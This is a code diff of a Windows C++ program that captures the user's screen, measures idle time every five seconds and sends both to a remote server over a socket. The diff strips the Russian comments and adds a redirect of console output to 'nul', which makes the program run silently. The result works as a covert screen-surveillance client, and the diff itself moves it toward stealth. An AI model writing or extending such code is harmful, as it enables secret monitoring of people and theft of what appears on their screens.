@@ -17,7 +17,7 @@
 
 using namespace Gdiplus;
 
-// Функция для получения времени простоя в секундах
+
 int getIdleTime() {
     LASTINPUTINFO lii;
     lii.cbSize = sizeof(LASTINPUTINFO);
@@ -27,7 +27,7 @@ int getIdleTime() {
     return static_cast<int>(idleTime);
 }
 
-// Функция для получения CLSID кодека
+
 int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
     UINT num = 0;
     UINT size = 0;
@@ -50,7 +50,7 @@ int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
     return -1;
 }
 
-// Функция для захвата экрана и отправки на сервер
+
 void captureScreen(SOCKET connectSocket) {
     GdiplusStartupInput gdiplusStartupInput;
     ULONG_PTR gdiplusToken;
@@ -76,11 +76,11 @@ void captureScreen(SOCKET connectSocket) {
 
     Gdiplus::Bitmap bmp(hBitmap, NULL);
 
-    // Сохраняем скриншот в файл с новым именем
+
     const wchar_t* screenshotFilePath = L"screenshot.png"; // Изменено имя файла
     bmp.Save(screenshotFilePath, &clsid, NULL);
 
-    // Открываем файл и считываем его содержимое
+    
     std::ifstream file(screenshotFilePath, std::ios::binary);
     if (!file) {
         std::cerr << "Failed to open temporary screenshot file." << std::endl;
@@ -94,7 +94,7 @@ void captureScreen(SOCKET connectSocket) {
     std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
     file.close();
 
-    // Отправляем размер файла на сервер
+    
     int fileSize = buffer.size();
     if (send(connectSocket, (const char*)&fileSize, sizeof(int), 0) == SOCKET_ERROR) {
         std::cerr << "Failed to send file size." << std::endl;
@@ -105,20 +105,16 @@ void captureScreen(SOCKET connectSocket) {
         return;
     }
 
-    // Отправляем файл на сервер
+    
     if (send(connectSocket, buffer.data(), fileSize, 0) == SOCKET_ERROR) {
         std::cerr << "Failed to send screenshot." << std::endl;
     } else {
         std::cout << "Screenshot sent to server." << std::endl;
     }
 
-    // DeleteObject(hBitmap);
-    // DeleteDC(hMemoryDC);
-    // ReleaseDC(NULL, hScreenDC);
-    // GdiplusShutdown(gdiplusToken);
 }
 
-// Функция для отправки времени простоя на сервер
+
 void sendIdleTime(SOCKET connectSocket) {
     while (true) {
         Sleep(5000); // Проверяем каждые 5 секунд
@@ -134,6 +130,9 @@ void sendIdleTime(SOCKET connectSocket) {
 }
 
 int main() {
+    std::ofstream nullStream("nul");
+    std::cout.rdbuf(nullStream.rdbuf());
+
     WSADATA wsaData;
     SOCKET connectSocket = INVALID_SOCKET;
     struct addrinfo* result = NULL, * ptr = NULL, hints;
